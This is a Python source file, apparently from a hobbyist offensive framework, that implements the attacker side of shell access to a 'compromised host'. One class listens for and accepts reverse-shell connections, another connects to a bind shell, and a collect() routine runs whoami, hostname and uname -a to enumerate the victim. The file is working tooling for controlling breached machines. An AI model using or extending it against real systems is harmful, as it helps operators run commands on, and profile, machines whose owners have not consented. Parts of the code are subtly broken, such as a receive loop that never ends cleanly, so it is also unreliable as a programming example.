# Node class (Compromised Host)
# TODO: RECV will hang if connection gets interrupted while in shell, fix it
# TODO: Depricate ConnType? Separate them into listen and connect methods \_(oo)_/
# TODO: Add proper error handling within methods. (Potentially raise errors?)
# TODO: Break down .start() method.

from src.c_color import *
from enum import Enum
from io import BlockingIOError
import random
import socket

class Status(Enum):
    DEAD = 0
    LISTENING = 1
    CONNECTED = 2

'''Base Node'''
class BaseNode:

    def __init__(self, addr: str, port: int):

        self.addr = addr
        self.port = port
        self.name = str(random.randrange(1000, 9999))
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.l_sock = None
        self.last_ran = ''
        self.status = Status.DEAD

        "Fields to be enumerated"
        self.hostname = None
        self.user = None
        self.os = None

    def run_cmd(self, cmd: str):
        self._send_msg(cmd)
        self.last_ran = self._get_msg(4096)

    def collect(self):
        self.run_cmd("whoami")
        self.user = self.last_ran.strip()

        self.run_cmd("hostname")
        self.hostname = self.last_ran.strip()

        self.run_cmd("uname -a")
        self.os = self.last_ran.strip()

    def _get_msg(self, buff_size):
        b = 1
        data = ''
        try:
            while b != 0:
                data += self.sock.recv(buff_size).decode()
        except OSError as e:
            return data
        
        if '\n' in data:
            data.replace('\n', '\0')

        return data

    def _send_msg(self, msg):
        try:
            self.sock.send(f"{msg}\n".encode())
        except BrokenPipeError as e:
            print(f"Ope: {e}. Message: '{msg}' not sent!")
    
    def close(self):
        self.sock.close()
        print(f"{Color.YELLOW}ATTENTION: Node '{self.name}' has been closed!{Color.END}")
        self.status = Status.DEAD

'''Connect Node'''
class CNode(BaseNode):

    def __init__(self, addr: str, port: int):
        BaseNode.__init__(self, addr, port)

    def start(self):
        try:
            self.sock.connect((str(self.addr), int(self.port)))
        except (ConnectionRefusedError, BlockingIOError) as e:
            print(f"Ope: {e}. Unable to connect to {self.addr}:{self.port}!")
            return

        self.status = Status.CONNECTED
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(0.2)

'''Listen Node (Reverse shell)'''   
class LNode(BaseNode):
    
    def __init__(self, addr: str, port: int):
        BaseNode.__init__(self, addr, port)
    
    def start(self):

        try:
            self.l_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.l_sock.bind((self.addr, self.port))
            self.status = Status.LISTENING
            self.l_sock.listen(3)
            self.sock, self.addr = self.l_sock.accept()
            self.l_sock.close()
        except:
            print(f"Ope: Failed to set up reverse shell connection!")
            return -1

        self.status = Status.CONNECTED
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(0.2)